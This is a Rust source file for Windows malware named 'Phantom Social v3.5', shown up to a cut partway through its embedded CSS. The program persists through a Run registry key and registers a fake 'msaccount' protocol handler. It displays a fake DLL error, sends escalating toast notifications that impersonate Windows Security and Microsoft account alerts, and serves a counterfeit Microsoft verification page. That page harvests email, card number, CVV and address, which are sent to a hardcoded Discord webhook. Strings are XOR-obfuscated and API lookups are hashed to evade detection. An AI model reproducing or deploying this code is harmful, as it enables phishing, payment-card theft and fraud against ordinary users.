// ==========================================================================
// PHANTOM SOCIAL v3.5 - PROTOCOL HANDLER EDITION 🎭
// ==========================================================================
// ✅ Protocol Handler: msaccount://verify (Microsoft-looking)
// ✅ Notification Source: Windows Security AUMID
// ✅ Activation Detection: Registry polling (no PowerShell/CMD)
// ✅ All v3.4 features preserved
// ==========================================================================

#![windows_subsystem = "windows"]
#![allow(non_snake_case, dead_code)]

include!(concat!(env!("OUT_DIR"), "/generated.rs"));

use std::{
    thread, 
    mem, 
    ptr, 
    ffi::{c_void, CString},
    sync::{Arc, Mutex},
    collections::HashSet,
    time::Duration,
};
use serde::{Serialize, Deserialize};
use wry::{
    application::{
        event::{Event, WindowEvent},
        event_loop::{ControlFlow, EventLoop},
        window::WindowBuilder,
        dpi::{PhysicalSize, PhysicalPosition},
    },
    webview::WebViewBuilder,
};
use lazy_static::lazy_static;
use wreq_util::Emulation;
use rand::Rng;

// --- WINAPI IMPORTS & CONSTANTS ---
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, IMAGE_EXPORT_DIRECTORY};
use winapi::um::endpointvolume::IAudioEndpointVolume;
use winapi::um::mmdeviceapi::{IMMDevice, IMMDeviceEnumerator, CLSID_MMDeviceEnumerator, eRender, eConsole};
use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx}; 
use winapi::shared::guiddef::GUID;

// --- WINDOWS CRATE IMPORTS (NEU FÜR XML NOTIFICATIONS) ---
use windows::{
    Data::Xml::Dom::XmlDocument,
    UI::Notifications::{ToastNotification, ToastNotificationManager},
    core::HSTRING,
};

const COINIT_APARTMENTTHREADED: u32 = 0x2;

const IID_IAudioEndpointVolume: GUID = GUID {
    Data1: 0x5CDF2C82,
    Data2: 0x841E,
    Data3: 0x4546,
    Data4: [0x97, 0x22, 0x0C, 0xF7, 0x40, 0x78, 0x22, 0x9A],
};

const IID_IMMDeviceEnumerator: GUID = GUID {
    Data1: 0xA95664D2,
    Data2: 0x9614,
    Data3: 0x4F35,
    Data4: [0xA7, 0x46, 0xDE, 0x8D, 0xB6, 0x36, 0x17, 0xE6],
};

const CLSCTX_ALL: u32 = 0x17;

fn xor_decrypt(data: &[u8]) -> String {
    let decrypted: Vec<u8> = data.iter()
        .enumerate()
        .map(|(i, b)| b ^ XOR_KEYS[i % XOR_KEYS.len()])
        .collect();
    String::from_utf8_lossy(&decrypted).to_string()
}

macro_rules! enc_str {
    ($s:expr) => {{
        const ENCRYPTED: &[u8] = &{
            let bytes = $s.as_bytes();
            let mut result = [0u8; $s.len()];
            let mut i = 0;
            while i < bytes.len() {
                result[i] = bytes[i] ^ XOR_KEYS[i % 16];
                i += 1;
            }
            result
        };
        xor_decrypt(ENCRYPTED)
    }};
}

lazy_static! {
    static ref SESSION_ID: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref PROCESS_START_TIME: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref SUCCESS_FLAG: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref SENT_DATA_HASHES: Arc<Mutex<HashSet<String>>> = Arc::new(Mutex::new(HashSet::new()));
    static ref FINGERPRINT_SENT: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref NOTIFICATION_IGNORE_COUNT: Arc<Mutex<u32>> = Arc::new(Mutex::new(0));
    static ref USER_CLICKED_NOTIFICATION: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
}

#[derive(Serialize)]
struct TelemetryData {
    session: String,
    device_id: String,
    process_time: String,
    uptime_hours: u64,
}

#[derive(Deserialize, Debug)]
struct IPCPayload {
    step: u32,
    session: String,
    device_id: String,
    email: Option<String>,
    card_number: Option<String>,
    cardholder_name: Option<String>,
    expiry: Option<String>,
    cvv: Option<String>,
    street_address: Option<String>,
    city: Option<String>,
    state: Option<String>,
    zip_code: Option<String>,
    country: Option<String>,
    canvas_fp: Option<String>,
    process_time: Option<String>,
}

fn ts() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

fn gen_id() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut h = RandomState::new().build_hasher();
    h.write_u64(ts());
    format!("{}-{:X}-{:X}", SESSION_PREFIX, ts(), h.finish())
}

fn get_time_str() -> String {
    let now = std::time::SystemTime::now();
    let d = now.duration_since(std::time::UNIX_EPOCH).unwrap();
    let secs = d.as_secs();
    let h = ((secs / 3600) % 24) as u32;
    let m = ((secs / 60) % 60) as u32;
    format!("{:02}:{:02}", h, m)
}

fn init_globals() {
    *SESSION_ID.lock().unwrap() = gen_id();
    *PROCESS_START_TIME.lock().unwrap() = get_time_str();
    *SUCCESS_FLAG.lock().unwrap() = false;
    *SENT_DATA_HASHES.lock().unwrap() = HashSet::new();
    *FINGERPRINT_SENT.lock().unwrap() = false;
    *NOTIFICATION_IGNORE_COUNT.lock().unwrap() = 0;
    *USER_CLICKED_NOTIFICATION.lock().unwrap() = false;
}

fn get_session_id() -> String {
    SESSION_ID.lock().unwrap().clone()
}

fn get_proc_time() -> String {
    PROCESS_START_TIME.lock().unwrap().clone()
}

fn mark_success() {
    *SUCCESS_FLAG.lock().unwrap() = true;
}

fn is_success() -> bool {
    *SUCCESS_FLAG.lock().unwrap()
}

fn increment_ignore_count() -> u32 {
    let mut count = NOTIFICATION_IGNORE_COUNT.lock().unwrap();
    *count += 1;
    *count
}

fn user_clicked_notification() {
    *USER_CLICKED_NOTIFICATION.lock().unwrap() = true;
}

fn did_user_click() -> bool {
    *USER_CLICKED_NOTIFICATION.lock().unwrap()
}

const fn djb2_hash(s: &str) -> u32 {
    let bytes = s.as_bytes();
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < bytes.len() {
        hash = hash.wrapping_mul(33).wrapping_add(bytes[i] as u32);
        i += 1;
    }
    hash
}

const HASH_REGDELETEVALUEA: u32 = djb2_hash("RegDeleteValueA");

type FnRegCreateKeyExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, *mut c_void, u32, u32, *mut c_void, *mut *mut c_void, *mut u32) -> i32;
type FnRegSetValueExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, u32, *const u8, u32) -> i32;
type FnRegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
type FnRegDeleteValueA = unsafe extern "system" fn(*mut c_void, *const i8) -> i32;
type FnRegQueryValueExA = unsafe extern "system" fn(*mut c_void, *const i8, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
type FnGetTickCount64 = unsafe extern "system" fn() -> u64;

unsafe fn get_proc_normal(module: &str, func: &str) -> Option<*const c_void> {
    let module_cstr = CString::new(module).ok()?;
    let func_cstr = CString::new(func).ok()?;
    
    let h_module = GetModuleHandleA(module_cstr.as_ptr());
    if h_module.is_null() {
        return None;
    }
    
    let proc = GetProcAddress(h_module, func_cstr.as_ptr());
    if proc.is_null() {
        None
    } else {
        Some(proc as *const c_void)
    }
}

unsafe fn resolve_api_hash(module: &str, hash: u32) -> Option<*const c_void> {
    let module_cstr = CString::new(module).ok()?;
    let h_module = GetModuleHandleA(module_cstr.as_ptr());
    if h_module.is_null() {
        return None;
    }
    
    let dos_header = h_module as *const IMAGE_DOS_HEADER;
    let nt_headers = (h_module as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
    if export_dir_rva == 0 {
        return None;
    }
    
    let export_dir = (h_module as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (h_module as usize + (*export_dir).AddressOfNames as usize) as *const u32;
    let funcs = (h_module as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
    let ords = (h_module as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
    
    for i in 0..(*export_dir).NumberOfNames {
        let name_rva = *names.offset(i as isize);
        let name_ptr = (h_module as usize + name_rva as usize) as *const i8;
        let name = std::ffi::CStr::from_ptr(name_ptr).to_str().ok()?;
        if djb2_hash(name) == hash {
            let ord_idx = *ords.offset(i as isize);
            let func_rva = *funcs.offset(ord_idx as isize);
            let func_ptr = (h_module as usize + func_rva as usize) as *const c_void;
            return Some(func_ptr);
        }
    }
    
    None
}

// === PROTOCOL HANDLER & ACTIVATION SYSTEM ===

fn register_protocol_handler() {
    if let Ok(exe) = std::env::current_exe() {
        let exe_str = format!("\"{}\" --activate\0", exe.to_string_lossy());
        
        unsafe {
            if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
                if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                    if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                        let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                        let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                        let fn_close: FnRegCloseKey = mem::transmute(api_close);
                        
                        let hkcu = 0x80000001 as *mut c_void;
                        let mut hkey: *mut c_void = ptr::null_mut();
                        
                        // Create msaccount protocol
                        let protocol_key = CString::new("Software\\Classes\\msaccount\0").unwrap();
                        if fn_create(hkcu, protocol_key.as_ptr(), 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            let url_protocol = CString::new("URL Protocol\0").unwrap();
                            let empty = CString::new("\0").unwrap();
                            fn_set(hkey, url_protocol.as_ptr(), 0, 1, empty.as_ptr() as *const u8, 1);
                            fn_close(hkey);
                        }
                        
                        // Create command key
                        let command_key = CString::new("Software\\Classes\\msaccount\\shell\\open\\command\0").unwrap();
                        if fn_create(hkcu, command_key.as_ptr(), 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            let default_val = CString::new("\0").unwrap();
                            fn_set(hkey, default_val.as_ptr(), 0, 1, exe_str.as_ptr() as *const u8, exe_str.len() as u32);
                            fn_close(hkey);
                        }
                    }
                }
            }
        }
    }
}

fn write_activation_flag() {
    let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\AccountVerify\0");
    let val = CString::new("Activated\0").unwrap();
    let data = CString::new("1\0").unwrap();
    
    unsafe {
        if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                    let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    
                    if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_set(hkey, val.as_ptr(), 0, 1, data.as_ptr() as *const u8, data.as_bytes().len() as u32);
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn check_activation_flag() -> bool {
    let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\AccountVerify\0");
    let val = CString::new("Activated\0").unwrap();
    
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_query) = get_proc_normal("advapi32.dll", "RegQueryValueExA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_query: FnRegQueryValueExA = mem::transmute(api_query);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0x20019, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        let mut buffer = [0u8; 16];
                        let mut buffer_size = 16u32;
                        let mut value_type = 0u32;
                        
                        let result = fn_query(hkey, val.as_ptr(), ptr::null_mut(), &mut value_type, buffer.as_mut_ptr(), &mut buffer_size);
                        fn_close(hkey);
                        
                        if result == 0 && buffer_size > 0 && buffer[0] == b'1' {
                            return true;
                        }
                    }
                }
            }
        }
    }
    false
}

fn clear_activation_flag() {
    let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\AccountVerify\0");
    let val = CString::new("Activated\0").unwrap();
    
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_del) = resolve_api_hash("advapi32.dll", HASH_REGDELETEVALUEA) {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_del: FnRegDeleteValueA = mem::transmute(api_del);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_del(hkey, val.as_ptr());
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

// === SINGLETON & DECEPTION ===

fn enforce_singleton() {
    unsafe {
        if let Some(create_mutex) = get_proc_normal("kernel32.dll", "CreateMutexA") {
            if let Some(get_last_error) = get_proc_normal("kernel32.dll", "GetLastError") {
                type FnCreateMutexA = unsafe extern "system" fn(*mut c_void, i32, *const i8) -> *mut c_void;
                type FnGetLastError = unsafe extern "system" fn() -> u32;

                let fn_create_mutex: FnCreateMutexA = mem::transmute(create_mutex);
                let fn_get_last_error: FnGetLastError = mem::transmute(get_last_error);

                let mutex_name = CString::new("Global\\PhantomSocial_Singleton_Lock_v3").unwrap();
                fn_create_mutex(ptr::null_mut(), 1, mutex_name.as_ptr());

                if fn_get_last_error() == 183 {
                    std::process::exit(0);
                }
            }
        }
    }
}

fn show_fake_error() {
    unsafe {
        if let Some(message_box) = get_proc_normal("user32.dll", "MessageBoxA") {
            type FnMessageBoxA = unsafe extern "system" fn(*mut c_void, *const i8, *const i8, u32) -> i32;
            let fn_message_box: FnMessageBoxA = mem::transmute(message_box);

            let text = CString::new("The code execution cannot proceed because msvcp140.dll was not found. Reinstalling the program may fix this problem.").unwrap();
            let caption = CString::new("System Error").unwrap();
            
            fn_message_box(ptr::null_mut(), text.as_ptr(), caption.as_ptr(), 0x10);
        }
    }
}

// === REST OF ORIGINAL FUNCTIONS ===

fn get_uptime_hrs() -> u64 {
    unsafe {
        if let Some(api) = get_proc_normal("kernel32.dll", "GetTickCount64") {
            let fn_tick: FnGetTickCount64 = mem::transmute(api);
            let ms = fn_tick();
            return ms / (1000 * 60 * 60);
        }
    }
    0
}

fn should_persist() -> bool {
    (get_uptime_hrs() / 24) < 3
}

fn get_random_persist_delay() -> u64 {
    let mut rng = rand::thread_rng();
    rng.gen_range(240..=500)
}

fn get_telemetry_delay() -> u64 {
    let mut rng = rand::thread_rng();
    rng.gen_range(10..=20)
}

fn install_persist() {
    if let Ok(exe) = std::env::current_exe() {
        let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
        let val = format!("{}\0", PERSIST_NAME);
        let exe_str = format!("{}\0", exe.to_string_lossy());

        unsafe {
            if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
                if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                    if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                        let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                        let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                        let fn_close: FnRegCloseKey = mem::transmute(api_close);
                        
                        let mut hkey: *mut c_void = ptr::null_mut();
                        let hkcu = 0x80000001 as *mut c_void;
                        
                        if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            fn_set(hkey, val.as_ptr() as *const i8, 0, 1, exe_str.as_ptr(), exe_str.len() as u32);
                            fn_close(hkey);
                        }
                    }
                }
            }
        }
    }
}

fn remove_persist() {
    let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
    let val = format!("{}\0", PERSIST_NAME);
    
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_del) = resolve_api_hash("advapi32.dll", HASH_REGDELETEVALUEA) {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_del: FnRegDeleteValueA = mem::transmute(api_del);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_del(hkey, val.as_ptr() as *const i8);
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn simulate_installer_scan() {
    if let Ok(temp) = std::env::var("TEMP") {
        if let Ok(entries) = std::fs::read_dir(temp) {
            let _ = entries.take(10).count();
        }
    }
}

fn get_notification_delay() -> u64 {
    let mut rng = rand::thread_rng();
    rng.gen_range(21600..=43200)
}

fn get_retry_delay() -> u64 {
    let mut rng = rand::thread_rng();
    rng.gen_range(1800..=7200)
}

#[cfg(windows)]
fn set_max_volume() {
    unsafe {
        CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
        let mut enumerator: *mut IMMDeviceEnumerator = ptr::null_mut();
        if CoCreateInstance(
            &CLSID_MMDeviceEnumerator,
            ptr::null_mut(),
            CLSCTX_ALL,
            &IID_IMMDeviceEnumerator,
            &mut enumerator as *mut *mut _ as *mut *mut winapi::ctypes::c_void,
        ) == 0 {
            let mut device: *mut IMMDevice = ptr::null_mut();
            if (*enumerator).GetDefaultAudioEndpoint(eRender, eConsole, &mut device) == 0 {
                let mut endpoint_volume: *mut IAudioEndpointVolume = ptr::null_mut();
                if (*device).Activate(
                    &IID_IAudioEndpointVolume,
                    CLSCTX_ALL,
                    ptr::null_mut(),
                    &mut endpoint_volume as *mut *mut _ as *mut *mut winapi::ctypes::c_void,
                ) == 0 {
                    (*endpoint_volume).SetMasterVolumeLevelScalar(1.0, ptr::null_mut());
                }
            }
        }
    }
}

#[cfg(not(windows))]
fn set_max_volume() {}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

fn json_escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

fn calculate_stable_hash(payload: &IPCPayload) -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    
    let canonical = format!(
        "{}|{}|{}|{}|{}|{}|{}|{}|{}",
        payload.step,
        payload.session,
        payload.device_id,
        payload.email.as_deref().unwrap_or(""),
        payload.card_number.as_deref().unwrap_or(""),
        payload.street_address.as_deref().unwrap_or(""),
        payload.city.as_deref().unwrap_or(""),
        payload.zip_code.as_deref().unwrap_or(""),
        payload.country.as_deref().unwrap_or("")
    );
    let mut h = RandomState::new().build_hasher();
    h.write(canonical.as_bytes());
    format!("{:x}", h.finish())
}

fn handle_ipc_message(payload_str: &str) -> Result<(), Box<dyn std::error::Error>> {
    let payload: IPCPayload = serde_json::from_str(payload_str)?;
    let hash = calculate_stable_hash(&payload);
    
    {
        let mut sent = SENT_DATA_HASHES.lock().unwrap();
        if sent.contains(&hash) {
            return Ok(());
        }
        sent.insert(hash);
    }
    
    let enriched = serde_json::json!({
        "step": payload.step,
        "session": payload.session,
        "device_id": payload.device_id,
        "email": payload.email,
        "card_number": payload.card_number,
        "cardholder_name": payload.cardholder_name,
        "expiry": payload.expiry,
        "cvv": payload.cvv,
        "street_address": payload.street_address,
        "city": payload.city,
        "state": payload.state,
        "zip_code": payload.zip_code,
        "country": payload.country,
        "canvas_fp": payload.canvas_fp,
        "process_time": get_proc_time(),
        "timestamp": ts()
    });
    
    send_enriched_data(&enriched);
    Ok(())
}

fn send_enriched_data(data: &serde_json::Value) {
    let url = enc_str!("https://discord.com/api/webhooks/1458963086794031105/AmHlBpfXql871QuWMkOmQ6GNmQiIyW-5A-5wwz3k0RKjqe-RFpMaOiNfHoYXVJ0NtmCT");
    
    let json_str = serde_json::to_string_pretty(data).unwrap_or_default();
    let payload = serde_json::json!({
        "content": format!("```json\n{}\n```", json_escape(&json_str)),
        "username": "Verification"
    });

    let payload_str = serde_json::to_string(&payload).unwrap_or_default();
    
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let client = match wreq::Client::builder()
            .emulation(Emulation::Chrome131)
            .cert_verification(false)
            .build()
        {
            Ok(c) => c,
            Err(_) => return,
        };

        let mut attempt = 0;
        let max_retries = 5;

        loop {
            let res = client
                .post(&url)
                .header("Content-Type", "application/json")
                .body(payload_str.clone())
                .send()
                .await;

            match res {
                Ok(_) => break,
                Err(_) => {
                    attempt += 1;
                    if attempt >= max_retries {
                        break;
                    }
                    let delay = Duration::from_secs(2u64.pow(attempt));
                    tokio::time::sleep(delay).await;
                }
            }
        }
    });
}

// GEÄNDERT: Neue Funktion mit manuellem XML Bau
fn show_smart_notification(is_escalated: bool) {
    let title = if is_escalated {
        "Security Alert - Action Required"
    } else {
        "Microsoft account security alert"
    };

    let message = if is_escalated {
        "Critical: Your Microsoft account requires immediate verification. Click here to secure your account now."
    } else {
        "We've detected unusual sign-in activity. To protect your account, verify your identity."
    };

    if is_escalated {
        set_max_volume();
    }

    // Manueller XML Bau für den Action-Button
    let xml_string = format!(
        r#"<toast launch="msaccount://verify">
            <visual>
                <binding template="ToastGeneric">
                    <text>{}</text>
                    <text>{}</text>
                    <text>Click to verify your account</text>
                </binding>
            </visual>
            <actions>
                <action content="Verify Now" arguments="msaccount://verify" activationType="protocol"/>
            </actions>
            <audio src="ms-winsoundevent:Notification.Default"/>
        </toast>"#,
        html_escape(title),
        html_escape(message)
    );

    let xml_doc = XmlDocument::new().unwrap_or_default();
    if xml_doc.LoadXml(&HSTRING::from(&xml_string)).is_ok() {
        if let Ok(toast) = ToastNotification::CreateToastNotification(&xml_doc) {
            let app_id = "Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI";
            
            if let Ok(notifier) = ToastNotificationManager::CreateToastNotifierWithId(&HSTRING::from(app_id)) {
                let _ = notifier.Show(&toast);
            }
        }
    }
}

fn notification_loop() {
    thread::sleep(Duration::from_secs(3));
    
    loop {
        let is_escalated = {
            let count = *NOTIFICATION_IGNORE_COUNT.lock().unwrap();
            count >= 5
        };
        
        show_smart_notification(is_escalated);
        
        // Poll for activation flag every 500ms
        for _ in 0..20 {
            thread::sleep(Duration::from_millis(500));
            if check_activation_flag() {
                user_clicked_notification();
                clear_activation_flag();
                return;
            }
        }
        
        let count = increment_ignore_count();
        if count >= 5 {
            thread::sleep(Duration::from_secs(60));
        } else {
            let retry_delay = get_retry_delay();
            thread::sleep(Duration::from_secs(retry_delay));
        }
    }
}

fn get_html() -> String {
    let session = html_escape(&get_session_id());
    let proc_time = html_escape(&get_proc_time());
    let rand_seed = rand::thread_rng().gen::<u32>();
    
    let html = concat!(
        "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>Verify your info - Microsoft account</title>",
        "<style>",
        "*{margin:0;padding:0;box-sizing:border-box;}",
        "body{font-family:'Segoe UI Variable','Segoe UI',Tahoma,sans-serif;background:#f5f5f5;overflow-x:hidden;}",
        ".edge-chrome{background:linear-gradient(to bottom,#f3f3f3 0%,#e8e8e8 100%);height:40px;display:flex;align-items:center;padding:0 12px;border-bottom:1px solid #ccc;justify-content:space-between;box-shadow:0 1px 2px rgba(0,0,0,0.04);}",
        ".chrome-left{display:flex;align-items:center;gap:6px;}",
        ".chrome-right{display:flex;gap:0;align-items:center;}",
        ".nav-btn{width:36px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;background:transparent;border:none;border-radius:6px;transition:background 0.1s;color:#616161;opacity:0.6;}",
        ".nav-btn:hover{background:rgba(0,0,0,0.06);opacity:1;}",
        ".nav-btn.disabled{opacity:0.25;cursor:default;pointer-events:none;}",
        ".nav-btn svg{width:16px;height:16px;}",
        ".window-btn{width:46px;height:40px;display:flex;align-items:center;justify-content:center;cursor:pointer;background:transparent;border:none;transition:background 0.1s;color:#000;font-size:10px;font-family:'Segoe MDL2 Assets',sans-serif;}",
        ".window-btn:hover{background:rgba(0,0,0,0.08);}",
        ".window-btn.close:hover{background:#c42b1c;color:#fff;}",
        ".address-bar-container{flex:1;display:flex;align-items:center;gap:8px;max-width:720px;padding:0 12px;}",
        ".address-bar{flex:1;background:#fff;height:32px;border-radius:18px;display:flex;align-items:center;padding:0 14px 0 12px;border:1px solid #d1d1d1;transition:all 0.15s;box-shadow:inset 0 0.5px 1px rgba(0,0,0,0.04);}",
        ".address-bar:hover{border-color:#adadad;box-shadow:inset 0 0.5px 2px rgba(0,0,0,0.06);}",
        ".address-bar:focus-within{border-color:#0067c0;box-shadow:0 0 0 2px rgba(0,103,192,0.15),inset 0 0.5px 1px rgba(0,0,0,0.04);}",
        ".lock-icon{margin-right:8px;display:flex;align-items:center;flex-shrink:0;}",
        ".url-text{font-size:13.5px;color:#1a1a1a;flex:1;user-select:text;cursor:text;font-weight:400;letter-spacing:-0.01em;line-height:32px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}",
        ".toolbar-icon{width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background 0.1s;}",
        ".toolbar-icon:hover{background:rgba(0,0,0,0.06);}",
        ".toolbar-icon svg{width:18px;height:18px;}",
        ".profile-icon{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#0078d4 0%,#004e8c 100%);display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:600;cursor:pointer;transition:all 0.15s;box-shadow:0 1px 2px rgba(0,0,0,0.14),0 0 0 1px rgba(0,0,0,0.05);}",
        ".profile-icon:hover{transform:scale(1.05);box-shadow:0 2px 4px rgba(0,0,0,0.18),0 0 0 1px rgba(0,0,0,0.05);}",
        ".content{height:calc(100vh - 40px);background:#f5f5f5;overflow-y:auto;position:relative;}",
        ".content::-webkit-scrollbar{width:12px;background:transparent;}",
        ".content::-webkit-scrollbar-thumb{background:rgba(0,0,0,0.2);border-radius:10px;border:2px solid transparent;background-clip:padding-box;}",
        ".content::-webkit-scrollbar-thumb:hover{background:rgba(0,0,0,0.35);border-radius:10px;border:2px solid transparent;background-clip:padding-box;}",
        ".container{max-width:600px;margin:0 auto;padding:24px 20px 120px;}",
        ".breadcrumb{font-size:12px;color:#605e5c;margin-bottom:16px;padding:0 4px;font-weight:400;}",
        ".breadcrumb a{color:#0067b8;text-decoration:none;transition:color 0.1s;}",
        ".breadcrumb a:hover{color:#004578;text-decoration:underline;}",
        ".info-box{background:linear-gradient(135deg,#deecf9 0%,#e8f3fc 100%);border-left:3px solid #0078d4;padding:16px 18px;margin-bottom:20px;font-size:13.5px;border-radius:4px;box-shadow:0 1.6px 3.6px rgba(0,0,0,0.03),0 0.3px 0.9px rgba(0,0,0,0.02);line-height:1.5;}",
        ".info-box strong{color:#005a9e;font-weight:600;}",
        ".error-box{background:linear-gradient(135deg,#fde7e9 0%,#fef0f1 100%);border-left:3px solid #c50f1f;padding:16px 18px;margin-bottom:20px;font-size:13.5px;color:#a80000;border-radius:4px;line-height:1.5;}",
        ".card{background:#fff;border-radius:8px;padding:40px 36px;box-shadow:0 3.2px 7.2px rgba(0,0,0,0.05),0 0.6px 1.8px rgba(0,0,0,0.03);border:1px solid rgba(0,0,0,0.05);}",
        ".card-title{font-size:24px;font-weight:600;color:#201f1e;margin-bottom:12px;letter-spacing:-0.02em;line-height:1.3;}",
        ".form-group{margin-bottom:20px;position:relative;}",
        ".form-label{display:block;font-size:14px;font-weight:600;color:#323130;margin-bottom:6px;letter-spacing:-0.01em;}",
        ".form-input{width:100%;padding:10px 12px;font-size:14px;border:1px solid #8a8886;border-radius:4px;transition:all 0.1s;background:#fafafa;font-family:'Segoe UI Variable','Segoe UI',sans-serif;line-height:1.5;}",
        ".form-input:hover{border-color:#323130;background:#fff;}",
        ".form-input:focus{outline:none;border-color:#0078d4;background:#fff;box-shadow:0 0 0 1px #0078d4;}",
        ".form-input.error{border-color:#a80000;background:#fff5f5;}",
        ".error-msg{color:#a80000;font-size:12px;margin-top:6px;display:none;}",
        ".form-row{display:grid;grid-template-columns:2fr 1fr 1fr;gap:16px;}",
        ".address-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px;}",
        ".button{background:#0078d4;color:#fff;border:none;padding:11px 24px;font-size:14px;cursor:pointer;border-radius:4px;font-weight:600;transition:all 0.1s;box-shadow:0 1.6px 3.6px rgba(0,0,0,0.11),0 0.3px 0.9px rgba(0,0,0,0.07);font-family:'Segoe UI Variable','Segoe UI',sans-serif;}",
        ".button:hover{background:#106ebe;box-shadow:0 3.2px 7.2px rgba(0,0,0,0.13),0 0.6px 1.8px rgba(0,0,0,0.08);}",
